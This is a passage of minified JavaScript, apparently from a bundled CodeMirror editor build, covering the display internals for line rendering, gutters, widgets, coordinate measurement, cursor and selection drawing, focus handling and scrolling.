d[S].apply(null,c)})},w=0;w<d.length;++w)y(w)}}function bS(){var i=Zl;Zl=null;for(var s=0;s<i.length;++s)i[s]()}function Xx(i,s,d,c){for(var p=0;p<s.changes.length;p++){var y=s.changes[p];y=="text"?wS(i,s):y=="gutter"?Jx(i,s,d,c):y=="class"?Mh(i,s):y=="widget"&&kS(i,s,c)}s.changes=null}function Jl(i){return i.node==i.text&&(i.node=J("div",null,null,"position: relative"),i.text.parentNode&&i.text.parentNode.replaceChild(i.node,i.text),i.node.appendChild(i.text),h&&m<8&&(i.node.style.zIndex=2)),i.node}function ES(i,s){var d=s.bgClass?s.bgClass+" "+(s.line.bgClass||""):s.line.bgClass;if(d&&(d+=" CodeMirror-linebackground"),s.background)d?s.background.className=d:(s.background.parentNode.removeChild(s.background),s.background=null);else if(d){var c=Jl(s);s.background=c.insertBefore(J("div",null,d),c.firstChild),i.display.input.setUneditable(s.background)}}function Zx(i,s){var d=i.display.externalMeasured;return d&&d.line==s.line?(i.display.externalMeasured=null,s.measure=d.measure,d.built):Gx(i,s)}function wS(i,s){var d=s.text.className,c=Zx(i,s);s.text==s.node&&(s.node=c.pre),s.text.parentNode.replaceChild(c.pre,s.text),s.text=c.pre,c.bgClass!=s.bgClass||c.textClass!=s.textClass?(s.bgClass=c.bgClass,s.textClass=c.textClass,Mh(i,s)):d&&(s.text.className=d)}function Mh(i,s){ES(i,s),s.line.wrapClass?Jl(s).className=s.line.wrapClass:s.node!=s.text&&(s.node.className="");var d=s.textClass?s.textClass+" "+(s.line.textClass||""):s.line.textClass;s.text.className=d||""}function Jx(i,s,d,c){if(s.gutter&&(s.node.removeChild(s.gutter),s.gutter=null),s.gutterBackground&&(s.node.removeChild(s.gutterBackground),s.gutterBackground=null),s.line.gutterClass){var p=Jl(s);s.gutterBackground=J("div",null,"CodeMirror-gutter-background "+s.line.gutterClass,"left: "+(i.options.fixedGutter?c.fixedPos:-c.gutterTotalWidth)+"px; width: "+c.gutterTotalWidth+"px"),i.display.input.setUneditable(s.gutterBackground),p.insertBefore(s.gutterBackground,s.text)}var y=s.line.gutterMarkers;if(i.options.lineNumbers||y){var w=Jl(s),S=s.gutter=J("div",null,"CodeMirror-gutter-wrapper","left: "+(i.options.fixedGutter?c.fixedPos:-c.gutterTotalWidth)+"px");if(S.setAttribute("aria-hidden","true"),i.display.input.setUneditable(S),w.insertBefore(S,s.text),s.line.gutterClass&&(S.className+=" "+s.line.gutterClass),i.options.lineNumbers&&(!y||!y["CodeMirror-linenumbers"])&&(s.lineNumber=S.appendChild(J("div",Ah(i.options,d),"CodeMirror-linenumber CodeMirror-gutter-elt","left: "+c.gutterLeft["CodeMirror-linenumbers"]+"px; width: "+i.display.lineNumInnerWidth+"px"))),y)for(var D=0;D<i.display.gutterSpecs.length;++D){var I=i.display.gutterSpecs[D].className,W=y.hasOwnProperty(I)&&y[I];W&&S.appendChild(J("div",[W],"CodeMirror-gutter-elt","left: "+c.gutterLeft[I]+"px; width: "+c.gutterWidth[I]+"px"))}}}function kS(i,s,d){s.alignable&&(s.alignable=null);for(var c=ne("CodeMirror-linewidget"),p=s.node.firstChild,y=void 0;p;p=y)y=p.nextSibling,c.test(p.className)&&s.node.removeChild(p);e1(i,s,d)}function TS(i,s,d,c){var p=Zx(i,s);return s.text=s.node=p.pre,p.bgClass&&(s.bgClass=p.bgClass),p.textClass&&(s.textClass=p.textClass),Mh(i,s),Jx(i,s,d,c),e1(i,s,c),s.node}function e1(i,s,d){if(t1(i,s.line,s,d,!0),s.rest)for(var c=0;c<s.rest.length;c++)t1(i,s.rest[c],s,d,!1)}function t1(i,s,d,c,p){if(s.widgets)for(var y=Jl(d),w=0,S=s.widgets;w<S.length;++w){var D=S[w],I=J("div",[D.node],"CodeMirror-linewidget"+(D.className?" "+D.className:""));D.handleMouseEvents||I.setAttribute("cm-ignore-events","true"),CS(D,I,d,c),i.display.input.setUneditable(I),p&&D.above?y.insertBefore(I,d.gutter||d.text):y.appendChild(I),un(D,"redraw")}}function CS(i,s,d,c){if(i.noHScroll){(d.alignable||(d.alignable=[])).push(s);var p=c.wrapperWidth;s.style.left=c.fixedPos+"px",i.coverGutter||(p-=c.gutterTotalWidth,s.style.paddingLeft=c.gutterTotalWidth+"px"),s.style.width=p+"px"}i.coverGutter&&(s.style.zIndex=5,s.style.position="relative",i.noHScroll||(s.style.marginLeft=-c.gutterTotalWidth+"px"))}function eo(i){if(i.height!=null)return i.height;var s=i.doc.cm;if(!s)return 0;if(!ae(document.body,i.node)){var d="position: relative;";i.coverGutter&&(d+="margin-left: -"+s.display.gutters.offsetWidth+"px;"),i.noHScroll&&(d+="width: "+s.display.wrapper.clientWidth+"px;"),ye(s.display.measure,J("div",[i.node],null,d))}return i.height=i.node.parentNode.offsetHeight}function yi(i,s){for(var d=Gl(s);d!=i.wrapper;d=d.parentNode)if(!d||d.nodeType==1&&d.getAttribute("cm-ignore-events")=="true"||d.parentNode==i.sizer&&d!=i.mover)return!0}function vc(i){return i.lineSpace.offsetTop}function Bh(i){return i.mover.offsetHeight-i.lineSpace.offsetHeight}function n1(i){if(i.cachedPaddingH)return i.cachedPaddingH;var s=ye(i.measure,J("pre","x","CodeMirror-line-like")),d=window.getComputedStyle?window.getComputedStyle(s):s.currentStyle,c={left:parseInt(d.paddingLeft),right:parseInt(d.paddingRight)};return!isNaN(c.left)&&!isNaN(c.right)&&(i.cachedPaddingH=c),c}function ni(i){return bt-i.display.nativeBarWidth}function Ba(i){return i.display.scroller.clientWidth-ni(i)-i.display.barWidth}function Hh(i){return i.display.scroller.clientHeight-ni(i)-i.display.barHeight}function SS(i,s,d){var c=i.options.lineWrapping,p=c&&Ba(i);if(!s.measure.heights||c&&s.measure.width!=p){var y=s.measure.heights=[];if(c){s.measure.width=p;for(var w=s.text.firstChild.getClientRects(),S=0;S<w.length-1;S++){var D=w[S],I=w[S+1];Math.abs(D.bottom-I.bottom)>2&&y.push((D.bottom+I.top)/2-d.top)}}y.push(d.bottom-d.top)}}function r1(i,s,d){if(i.line==s)return{map:i.measure.map,cache:i.measure.cache};if(i.rest){for(var c=0;c<i.rest.length;c++)if(i.rest[c]==s)return{map:i.measure.maps[c],cache:i.measure.caches[c]};for(var p=0;p<i.rest.length;p++)if(wt(i.rest[p])>d)return{map:i.measure.maps[p],cache:i.measure.caches[p],before:!0}}}function NS(i,s){s=Br(s);var d=wt(s),c=i.display.externalMeasured=new Kx(i.doc,s,d);c.lineN=d;var p=c.built=Gx(i,c);return c.text=p.pre,ye(i.display.lineMeasure,p.pre),c}function i1(i,s,d,c){return ri(i,Ns(i,s),d,c)}function Uh(i,s){if(s>=i.display.viewFrom&&s<i.display.viewTo)return i.display.view[za(i,s)];var d=i.display.externalMeasured;if(d&&s>=d.lineN&&s<d.lineN+d.size)return d}function Ns(i,s){var d=wt(s),c=Uh(i,d);c&&!c.text?c=null:c&&c.changes&&(Xx(i,c,d,Yh(i)),i.curOp.forceUpdate=!0),c||(c=NS(i,s));var p=r1(c,s,d);return{line:s,view:c,rect:null,map:p.map,cache:p.cache,before:p.before,hasHeights:!1}}function ri(i,s,d,c,p){s.before&&(d=-1);var y=d+(c||""),w;return s.cache.hasOwnProperty(y)?w=s.cache[y]:(s.rect||(s.rect=s.view.text.getBoundingClientRect()),s.hasHeights||(SS(i,s.view,s.rect),s.hasHeights=!0),w=DS(i,s,d,c),w.bogus||(s.cache[y]=w)),{left:w.left,right:w.right,top:p?w.rtop:w.top,bottom:p?w.rbottom:w.bottom}}var a1={left:0,right:0,top:0,bottom:0};function s1(i,s,d){for(var c,p,y,w,S,D,I=0;I<i.length;I+=3)if(S=i[I],D=i[I+1],s<S?(p=0,y=1,w="left"):s<D?(p=s-S,y=p+1):(I==i.length-3||s==D&&i[I+3]>s)&&(y=D-S,p=y-1,s>=D&&(w="right")),p!=null){if(c=i[I+2],S==D&&d==(c.insertLeft?"left":"right")&&(w=d),d=="left"&&p==0)for(;I&&i[I-2]==i[I-3]&&i[I-1].insertLeft;)c=i[(I-=3)+2],w="left";if(d=="right"&&p==D-S)for(;I<i.length-3&&i[I+3]==i[I+4]&&!i[I+5].insertLeft;)c=i[(I+=3)+2],w="right";break}return{node:c,start:p,end:y,collapse:w,coverStart:S,coverEnd:D}}function AS(i,s){var d=a1;if(s=="left")for(var c=0;c<i.length&&(d=i[c]).left==d.right;c++);else for(var p=i.length-1;p>=0&&(d=i[p]).left==d.right;p--);return d}function DS(i,s,d,c){var p=s1(s.map,d,c),y=p.node,w=p.start,S=p.end,D=p.collapse,I;if(y.nodeType==3){for(var W=0;W<4;W++){for(;w&&G(s.line.text.charAt(p.coverStart+w));)--w;for(;p.coverStart+S<p.coverEnd&&G(s.line.text.charAt(p.coverStart+S));)++S;if(h&&m<9&&w==0&&S==p.coverEnd-p.coverStart?I=y.parentNode.getBoundingClientRect():I=AS(oe(y,w,S).getClientRects(),c),I.left||I.right||w==0)break;S=w,w=w-1,D="right"}h&&m<11&&(I=LS(i.display.measure,I))}else{w>0&&(D=c="right");var K;i.options.lineWrapping&&(K=y.getClientRects()).length>1?I=K[c=="right"?K.length-1:0]:I=y.getBoundingClientRect()}if(h&&m<9&&!w&&(!I||!I.left&&!I.right)){var ie=y.parentNode.getClientRects()[0];ie?I={left:ie.left,right:ie.left+Ds(i.display),top:ie.top,bottom:ie.bottom}:I=a1}for(var re=I.top-s.rect.top,de=I.bottom-s.rect.top,ge=(re+de)/2,ke=s.view.measure.heights,Ie=0;Ie<ke.length-1&&!(ge<ke[Ie]);Ie++);var Oe=Ie?ke[Ie-1]:0,Pe=ke[Ie],Me={left:(D=="right"?I.right:I.left)-s.rect.left,right:(D=="left"?I.left:I.right)-s.rect.left,top:Oe,bottom:Pe};return!I.left&&!I.right&&(Me.bogus=!0),i.options.singleCursorHeightPerLine||(Me.rtop=re,Me.rbottom=de),Me}function LS(i,s){if(!window.screen||screen.logicalXDPI==null||screen.logicalXDPI==screen.deviceXDPI||!$C(i))return s;var d=screen.logicalXDPI/screen.deviceXDPI,c=screen.logicalYDPI/screen.deviceYDPI;return{left:s.left*d,right:s.right*d,top:s.top*c,bottom:s.bottom*c}}function l1(i){if(i.measure&&(i.measure.cache={},i.measure.heights=null,i.rest))for(var s=0;s<i.rest.length;s++)i.measure.caches[s]={}}function o1(i){i.display.externalMeasure=null,me(i.display.lineMeasure);for(var s=0;s<i.display.view.length;s++)l1(i.display.view[s])}function to(i){o1(i),i.display.cachedCharWidth=i.display.cachedTextHeight=i.display.cachedPaddingH=null,i.options.lineWrapping||(i.display.maxLineChanged=!0),i.display.lineNumChars=null}function u1(i){return b&&A?-(i.body.getBoundingClientRect().left-parseInt(getComputedStyle(i.body).marginLeft)):i.defaultView.pageXOffset||(i.documentElement||i.body).scrollLeft}function c1(i){return b&&A?-(i.body.getBoundingClientRect().top-parseInt(getComputedStyle(i.body).marginTop)):i.defaultView.pageYOffset||(i.documentElement||i.body).scrollTop}function zh(i){var s=Br(i),d=s.widgets,c=0;if(d)for(var p=0;p<d.length;++p)d[p].above&&(c+=eo(d[p]));return c}function bc(i,s,d,c,p){if(!p){var y=zh(s);d.top+=y,d.bottom+=y}if(c=="line")return d;c||(c="local");var w=xi(s);if(c=="local"?w+=vc(i.display):w-=i.display.viewOffset,c=="page"||c=="window"){var S=i.display.lineSpace.getBoundingClientRect();w+=S.top+(c=="window"?0:c1(k(i)));var D=S.left+(c=="window"?0:u1(k(i)));d.left+=D,d.right+=D}return d.top+=w,d.bottom+=w,d}function d1(i,s,d){if(d=="div")return s;var c=s.left,p=s.top;if(d=="page")c-=u1(k(i)),p-=c1(k(i));else if(d=="local"||!d){var y=i.display.sizer.getBoundingClientRect();c+=y.left,p+=y.top}var w=i.display.lineSpace.getBoundingClientRect();return{left:c-w.left,top:p-w.top}}function Ec(i,s,d,c,p){return c||(c=Ye(i.doc,s.line)),bc(i,c,i1(i,c,s.ch,p),d)}function Hr(i,s,d,c,p,y){c=c||Ye(i.doc,s.line),p||(p=Ns(i,c));function w(de,ge){var ke=ri(i,p,de,ge?"right":"left",y);return ge?ke.left=ke.right:ke.right=ke.left,bc(i,c,ke,d)}var S=Le(c,i.doc.direction),D=s.ch,I=s.sticky;if(D>=c.text.length?(D=c.text.length,I="before"):D<=0&&(D=0,I="after"),!S)return w(I=="before"?D-1:D,I=="before");function W(de,ge,ke){var Ie=S[ge],Oe=Ie.level==1;return w(ke?de-1:de,Oe!=ke)}var K=Be(S,D,I),ie=Re,re=W(D,K,I=="before");return ie!=null&&(re.other=W(D,ie,I!="before")),re}function f1(i,s){var d=0;s=Je(i.doc,s),i.options.lineWrapping||(d=Ds(i.display)*s.ch);var c=Ye(i.doc,s.line),p=xi(c)+vc(i.display);return{left:d,right:d,top:p,bottom:p+c.height}}function Wh(i,s,d,c,p){var y=ve(i,s,d);return y.xRel=p,c&&(y.outside=c),y}function qh(i,s,d){var c=i.doc;if(d+=i.display.viewOffset,d<0)return Wh(c.first,0,null,-1,-1);var p=Ma(c,d),y=c.first+c.size-1;if(p>y)return Wh(c.first+c.size-1,Ye(c,y).text.length,null,1,1);s<0&&(s=0);for(var w=Ye(c,p);;){var S=_S(i,w,p,s,d),D=aS(w,S.ch+(S.xRel>0||S.outside>0?1:0));if(!D)return S;var I=D.find(1);if(I.line==p)return I;w=Ye(c,p=I.line)}}function h1(i,s,d,c){c-=zh(s);var p=s.text.length,y=Ce(function(w){return ri(i,d,w-1).bottom<=c},p,0);return p=Ce(function(w){return ri(i,d,w).top>c},y,p),{begin:y,end:p}}function p1(i,s,d,c){d||(d=Ns(i,s));var p=bc(i,s,ri(i,d,c),"line").top;return h1(i,s,d,p)}function $h(i,s,d,c){return i.bottom<=d?!1:i.top>d?!0:(c?i.left:i.right)>s}function _S(i,s,d,c,p){p-=xi(s);var y=Ns(i,s),w=zh(s),S=0,D=s.text.length,I=!0,W=Le(s,i.doc.direction);if(W){var K=(i.options.lineWrapping?PS:IS)(i,s,d,y,W,c,p);I=K.level!=1,S=I?K.from:K.to-1,D=I?K.to:K.from-1}var ie=null,re=null,de=Ce(function(Qe){var Ge=ri(i,y,Qe);return Ge.top+=w,Ge.bottom+=w,$h(Ge,c,p,!1)?(Ge.top<=p&&Ge.left<=c&&(ie=Qe,re=Ge),!0):!1},S,D),ge,ke,Ie=!1;if(re){var Oe=c-re.left<re.right-c,Pe=Oe==I;de=ie+(Pe?0:1),ke=Pe?"after":"before",ge=Oe?re.left:re.right}else{!I&&(de==D||de==S)&&de++,ke=de==0?"after":de==s.text.length?"before":ri(i,y,de-(I?1:0)).bottom+w<=p==I?"after":"before";var Me=Hr(i,ve(d,de,ke),"line",s,y);ge=Me.left,Ie=p<Me.top?-1:p>=Me.bottom?1:0}return de=te(s.text,de,1),Wh(d,de,ke,Ie,c-ge)}function IS(i,s,d,c,p,y,w){var S=Ce(function(K){var ie=p[K],re=ie.level!=1;return $h(Hr(i,ve(d,re?ie.to:ie.from,re?"before":"after"),"line",s,c),y,w,!0)},0,p.length-1),D=p[S];if(S>0){var I=D.level!=1,W=Hr(i,ve(d,I?D.from:D.to,I?"after":"before"),"line",s,c);$h(W,y,w,!0)&&W.top>w&&(D=p[S-1])}return D}function PS(i,s,d,c,p,y,w){var S=h1(i,s,c,w),D=S.begin,I=S.end;/\s/.test(s.text.charAt(I-1))&&I--;for(var W=null,K=null,ie=0;ie<p.length;ie++){var re=p[ie];if(!(re.from>=I||re.to<=D)){var de=re.level!=1,ge=ri(i,c,de?Math.min(I,re.to)-1:Math.max(D,re.from)).right,ke=ge<y?y-ge+1e9:ge-y;(!W||K>ke)&&(W=re,K=ke)}}return W||(W=p[p.length-1]),W.from<D&&(W={from:D,to:W.to,level:W.level}),W.to>I&&(W={from:W.from,to:I,level:W.level}),W}var Ha;function As(i){if(i.cachedTextHeight!=null)return i.cachedTextHeight;if(Ha==null){Ha=J("pre",null,"CodeMirror-line-like");for(var s=0;s<49;++s)Ha.appendChild(document.createTextNode("x")),Ha.appendChild(J("br"));Ha.appendChild(document.createTextNode("x"))}ye(i.measure,Ha);var d=Ha.offsetHeight/50;return d>3&&(i.cachedTextHeight=d),me(i.measure),d||1}function Ds(i){if(i.cachedCharWidth!=null)return i.cachedCharWidth;var s=J("span","xxxxxxxxxx"),d=J("pre",[s],"CodeMirror-line-like");ye(i.measure,d);var c=s.getBoundingClientRect(),p=(c.right-c.left)/10;return p>2&&(i.cachedCharWidth=p),p||10}function Yh(i){for(var s=i.display,d={},c={},p=s.gutters.clientLeft,y=s.gutters.firstChild,w=0;y;y=y.nextSibling,++w){var S=i.display.gutterSpecs[w].className;d[S]=y.offsetLeft+y.clientLeft+p,c[S]=y.clientWidth}return{fixedPos:Vh(s),gutterTotalWidth:s.gutters.offsetWidth,gutterLeft:d,gutterWidth:c,wrapperWidth:s.wrapper.clientWidth}}function Vh(i){return i.scroller.getBoundingClientRect().left-i.sizer.getBoundingClientRect().left}function m1(i){var s=As(i.display),d=i.options.lineWrapping,c=d&&Math.max(5,i.display.scroller.clientWidth/Ds(i.display)-3);return function(p){if($i(i.doc,p))return 0;var y=0;if(p.widgets)for(var w=0;w<p.widgets.length;w++)p.widgets[w].height&&(y+=p.widgets[w].height);return d?y+(Math.ceil(p.text.length/c)||1)*s:y+s}}function Gh(i){var s=i.doc,d=m1(i);s.iter(function(c){var p=d(c);p!=c.height&&ei(c,p)})}function Ua(i,s,d,c){var p=i.display;if(!d&&Gl(s).getAttribute("cm-not-content")=="true")return null;var y,w,S=p.lineSpace.getBoundingClientRect();try{y=s.clientX-S.left,w=s.clientY-S.top}catch{return null}var D=qh(i,y,w),I;if(c&&D.xRel>0&&(I=Ye(i.doc,D.line).text).length==D.ch){var W=lt(I,I.length,i.options.tabSize)-I.length;D=ve(D.line,Math.max(0,Math.round((y-n1(i.display).left)/Ds(i.display))-W))}return D}function za(i,s){if(s>=i.display.viewTo||(s-=i.display.viewFrom,s<0))return null;for(var d=i.display.view,c=0;c<d.length;c++)if(s-=d[c].size,s<0)return c}function qn(i,s,d,c){s==null&&(s=i.doc.first),d==null&&(d=i.doc.first+i.doc.size),c||(c=0);var p=i.display;if(c&&d<p.viewTo&&(p.updateLineNumbers==null||p.updateLineNumbers>s)&&(p.updateLineNumbers=s),i.curOp.viewChanged=!0,s>=p.viewTo)gi&&Rh(i.doc,s)<p.viewTo&&Vi(i);else if(d<=p.viewFrom)gi&&Yx(i.doc,d+c)>p.viewFrom?Vi(i):(p.viewFrom+=c,p.viewTo+=c);else if(s<=p.viewFrom&&d>=p.viewTo)Vi(i);else if(s<=p.viewFrom){var y=wc(i,d,d+c,1);y?(p.view=p.view.slice(y.index),p.viewFrom=y.lineN,p.viewTo+=c):Vi(i)}else if(d>=p.viewTo){var w=wc(i,s,s,-1);w?(p.view=p.view.slice(0,w.index),p.viewTo=w.lineN):Vi(i)}else{var S=wc(i,s,s,-1),D=wc(i,d,d+c,1);S&&D?(p.view=p.view.slice(0,S.index).concat(yc(i,S.lineN,D.lineN)).concat(p.view.slice(D.index)),p.viewTo+=c):Vi(i)}var I=p.externalMeasured;I&&(d<I.lineN?I.lineN+=c:s<I.lineN+I.size&&(p.externalMeasured=null))}function Yi(i,s,d){i.curOp.viewChanged=!0;var c=i.display,p=i.display.externalMeasured;if(p&&s>=p.lineN&&s<p.lineN+p.size&&(c.externalMeasured=null),!(s<c.viewFrom||s>=c.viewTo)){var y=c.view[za(i,s)];if(y.node!=null){var w=y.changes||(y.changes=[]);ut(w,d)==-1&&w.push(d)}}}function Vi(i){i.display.viewFrom=i.display.viewTo=i.doc.first,i.display.view=[],i.display.viewOffset=0}function wc(i,s,d,c){var p=za(i,s),y,w=i.display.view;if(!gi||d==i.doc.first+i.doc.size)return{index:p,lineN:d};for(var S=i.display.viewFrom,D=0;D<p;D++)S+=w[D].size;if(S!=s){if(c>0){if(p==w.length-1)return null;y=S+w[p].size-s,p++}else y=S-s;s+=y,d+=y}for(;Rh(i.doc,d)!=d;){if(p==(c<0?0:w.length-1))return null;d+=c*w[p-(c<0?1:0)].size,p+=c}return{index:p,lineN:d}}function jS(i,s,d){var c=i.display,p=c.view;p.length==0||s>=c.viewTo||d<=c.viewFrom?(c.view=yc(i,s,d),c.viewFrom=s):(c.viewFrom>s?c.view=yc(i,s,c.viewFrom).concat(c.view):c.viewFrom<s&&(c.view=c.view.slice(za(i,s))),c.viewFrom=s,c.viewTo<d?c.view=c.view.concat(yc(i,c.viewTo,d)):c.viewTo>d&&(c.view=c.view.slice(0,za(i,d)))),c.viewTo=d}function g1(i){for(var s=i.display.view,d=0,c=0;c<s.length;c++){var p=s[c];!p.hidden&&(!p.node||p.changes)&&++d}return d}function no(i){i.display.input.showSelection(i.display.input.prepareSelection())}function x1(i,s){s===void 0&&(s=!0);var d=i.doc,c={},p=c.cursors=document.createDocumentFragment(),y=c.selection=document.createDocumentFragment(),w=i.options.$customCursor;w&&(s=!0);for(var S=0;S<d.sel.ranges.length;S++)if(!(!s&&S==d.sel.primIndex)){var D=d.sel.ranges[S];if(!(D.from().line>=i.display.viewTo||D.to().line<i.display.viewFrom)){var I=D.empty();if(w){var W=w(i,D);W&&Qh(i,W,p)}else(I||i.options.showCursorWhenSelecting)&&Qh(i,D.head,p);I||RS(i,D,y)}}return c}function Qh(i,s,d){var c=Hr(i,s,"div",null,null,!i.options.singleCursorHeightPerLine),p=d.appendChild(J("div","","CodeMirror-cursor"));if(p.style.left=c.left+"px",p.style.top=c.top+"px",p.style.height=Math.max(0,c.bottom-c.top)*i.options.cursorHeight+"px",/\bcm-fat-cursor\b/.test(i.getWrapperElement().className)){var y=Ec(i,s,"div",null,null),w=y.right-y.left;p.style.width=(w>0?w:i.defaultCharWidth())+"px"}if(c.other){var S=d.appendChild(J("div","","CodeMirror-cursor CodeMirror-secondarycursor"));S.style.display="",S.style.left=c.other.left+"px",S.style.top=c.other.top+"px",S.style.height=(c.other.bottom-c.other.top)*.85+"px"}}function kc(i,s){return i.top-s.top||i.left-s.left}function RS(i,s,d){var c=i.display,p=i.doc,y=document.createDocumentFragment(),w=n1(i.display),S=w.left,D=Math.max(c.sizerWidth,Ba(i)-c.sizer.offsetLeft)-w.right,I=p.direction=="ltr";function W(Pe,Me,Qe,Ge){Me<0&&(Me=0),Me=Math.round(Me),Ge=Math.round(Ge),y.appendChild(J("div",null,"CodeMirror-selected","position: absolute; left: "+Pe+`px;
                             top: `+Me+"px; width: "+(Qe??D-Pe)+`px;
                             height: `+(Ge-Me)+"px"))}function K(Pe,Me,Qe){var Ge=Ye(p,Pe),nt=Ge.text.length,Nt,fn;function Ht(Zt,Vn){return Ec(i,ve(Pe,Zt),"div",Ge,Vn)}function nr(Zt,Vn,xn){var an=p1(i,Ge,null,Zt),Jt=Vn=="ltr"==(xn=="after")?"left":"right",qt=xn=="after"?an.begin:an.end-(/\s/.test(Ge.text.charAt(an.end-1))?2:1);return Ht(qt,Jt)[Jt]}var Yn=Le(Ge,p.direction);return je(Yn,Me||0,Qe??nt,function(Zt,Vn,xn,an){var Jt=xn=="ltr",qt=Ht(Zt,Jt?"left":"right"),Gn=Ht(Vn-1,Jt?"right":"left"),zs=Me==null&&Zt==0,Ji=Qe==null&&Vn==nt,Sn=an==0,ii=!Yn||an==Yn.length-1;if(Gn.top-qt.top<=3){var hn=(I?zs:Ji)&&Sn,wp=(I?Ji:zs)&&ii,Ei=hn?S:(Jt?qt:Gn).left,Va=wp?D:(Jt?Gn:qt).right;W(Ei,qt.top,Va-Ei,qt.bottom)}else{var Ga,In,Ws,kp;Jt?(Ga=I&&zs&&Sn?S:qt.left,In=I?D:nr(Zt,xn,"before"),Ws=I?S:nr(Vn,xn,"after"),kp=I&&Ji&&ii?D:Gn.right):(Ga=I?nr(Zt,xn,"before"):S,In=!I&&zs&&Sn?D:qt.right,Ws=!I&&Ji&&ii?S:Gn.left,kp=I?nr(Vn,xn,"after"):D),W(Ga,qt.top,In-Ga,qt.bottom),qt.bottom<Gn.top&&W(S,qt.bottom,null,Gn.top),W(Ws,Gn.top,kp-Ws,Gn.bottom)}(!Nt||kc(qt,Nt)<0)&&(Nt=qt),kc(Gn,Nt)<0&&(Nt=Gn),(!fn||kc(qt,fn)<0)&&(fn=qt),kc(Gn,fn)<0&&(fn=Gn)}),{start:Nt,end:fn}}var ie=s.from(),re=s.to();if(ie.line==re.line)K(ie.line,ie.ch,re.ch);else{var de=Ye(p,ie.line),ge=Ye(p,re.line),ke=Br(de)==Br(ge),Ie=K(ie.line,ie.ch,ke?de.text.length+1:null).end,Oe=K(re.line,ke?0:null,re.ch).start;ke&&(Ie.top<Oe.top-2?(W(Ie.right,Ie.top,null,Ie.bottom),W(S,Oe.top,Oe.left,Oe.bottom)):W(Ie.right,Ie.top,Oe.left-Ie.right,Ie.bottom)),Ie.bottom<Oe.top&&W(S,Ie.bottom,null,Oe.top)}d.appendChild(y)}function Kh(i){if(i.state.focused){var s=i.display;clearInterval(s.blinker);var d=!0;s.cursorDiv.style.visibility="",i.options.cursorBlinkRate>0?s.blinker=setInterval(function(){i.hasFocus()||Ls(i),s.cursorDiv.style.visibility=(d=!d)?"":"hidden"},i.options.cursorBlinkRate):i.options.cursorBlinkRate<0&&(s.cursorDiv.style.visibility="hidden")}}function y1(i){i.hasFocus()||(i.display.input.focus(),i.state.focused||Zh(i))}function Xh(i){i.state.delayingBlurEvent=!0,setTimeout(function(){i.state.delayingBlurEvent&&(i.state.delayingBlurEvent=!1,i.state.focused&&Ls(i))},100)}function Zh(i,s){i.state.delayingBlurEvent&&!i.state.draggingText&&(i.state.delayingBlurEvent=!1),i.options.readOnly!="nocursor"&&(i.state.focused||(xt(i,"focus",i,s),i.state.focused=!0,q(i.display.wrapper,"CodeMirror-focused"),!i.curOp&&i.display.selForContextMenu!=i.doc.sel&&(i.display.input.reset(),x&&setTimeout(function(){return i.display.input.reset(!0)},20)),i.display.input.receivedFocus()),Kh(i))}function Ls(i,s){i.state.delayingBlurEvent||(i.state.focused&&(xt(i,"blur",i,s),i.state.focused=!1,Z(i.display.wrapper,"CodeMirror-focused")),clearInterval(i.display.blinker),setTimeout(function(){i.state.focused||(i.display.shift=!1)},150))}function Tc(i){for(var s=i.display,d=s.lineDiv.offsetTop,c=Math.max(0,s.scroller.getBoundingClientRect().top),p=s.lineDiv.getBoundingClientRect().top,y=0,w=0;w<s.view.length;w++){var S=s.view[w],D=i.options.lineWrapping,I=void 0,W=0;if(!S.hidden){if(p+=S.line.height,h&&m<8){var K=S.node.offsetTop+S.node.offsetHeight;I=K-d,d=K}else{var ie=S.node.getBoundingClientRect();I=ie.bottom-ie.top,!D&&S.text.firstChild&&(W=S.text.firstChild.getBoundingClientRect().right-ie.left-1)}var re=S.line.height-I;if((re>.005||re<-.005)&&(p<c&&(y-=re),ei(S.line,I),v1(S.line),S.rest))for(var de=0;de<S.rest.length;de++)v1(S.rest[de]);if(W>i.display.sizerWidth){var ge=Math.ceil(W/Ds(i.display));ge>i.display.maxLineLength&&(i.display.maxLineLength=ge,i.display.maxLine=S.line,i.display.maxLineChanged=!0)}}}Math.abs(y)>2&&(s.scroller.scrollTop+=y)}function v1(i){if(i.widgets)for(var s=0;s<i.widgets.length;++s){var d=i.widgets[s],c=d.node.parentNode;c&&(d.height=c.offsetHeight)}}function Cc(i,s,d){var c=d&&d.top!=null?Math.max(0,d.top):i.scroller.scrollTop;c=Math.floor(c-vc(i));var p=d&&d.bottom!=null?d.bottom:c+i.wrapper.clientHeight,y=Ma(s,c),w=Ma(s,p);if(d&&d.ensure){var S=d.ensure.from.line,D=d.ensure.to.line;S<y?(y=S,w=Ma(s,xi(Ye(s,S))+i.wrapper.clientHeight)):Math.min(D,s.lastLine())>=w&&(y=Ma(s,xi(Ye(s,D))-i.wrapper.clientHeight),w=D)}return{from:y,to:Math.max(w,y+1)}}function OS(i,s){if(!tt(i,"scrollCursorIntoView")){var d=i.display,c=d.sizer.getBoundingClientRect(),p=null,y=d.wrapper.ownerDocument;if(s.top+c.top<0?p=!0:s.bottom+c.top>(y.defaultView.innerHeight||y.documentElement.clientHeight)&&(p=!1),p!=null&&!N){var w=J("div","",null,`position: absolute;
                         top: `+(s.top-d.viewOffset-vc(i.display))+`px;
                         height: `+(s.bottom-s.top+ni(i)+d.barHeight)+`px;
                         left: `+s.left+"px; width: "+Math.max(2,s.right-s.left)+"px;");i.display.lineSpace.appendChild(w),w.scrollIntoView(p),i.display.lineSpace.removeChild(w)}}}function FS(i,s,d,c){c==null&&(c=0);var p;!i.options.lineWrapping&&s==d&&(d=s.sticky=="before"?ve(s.line,s.ch+1,"before"):s,s=s.ch?ve(s.line,s.sticky=="before"?s.ch-1:s.ch,"after"):s);for(var y=0;y<5;y++){var w=!1,S=Hr(i,s),D=!d||d==s?S:Hr(i,d);p={left:Math.min(S.left,D.left),top:Math.min(S.top,D.top)-c,right:Math.max(S.left,D.left),bottom:Math.max(S.bottom,D.bottom)+c};var I=Jh(i,p),W=i.doc.scrollTop,K=i.doc.scrollLeft;if(I.scrollTop!=null&&(io(i,I.scrollTop),Math.abs(i.doc.scrollTop-W)>1&&(w=!0)),I.scrollLeft!=null&&(Wa(i,I.scrollLeft),Math.abs(i.doc.scrollLeft-K)>1&&(w=!0)),!w)break}return p}function MS(i,s){var d=Jh(i,s);d.scrollTop!=null&&io(i,d.scrollTop),d.scrollLeft!=null&&Wa(i,d.scrollLeft)}function Jh(i,s){var d=i.display,c=As(i.display);s.top<0&&(s.top=0);var p=i.curOp&&i.curOp.scrollTop!=null?i.curOp.scrollTop:d.scroller.scrollTop,y=Hh(i),w={};s.bottom-s.top>y&&(s.bottom=s.top+y);var 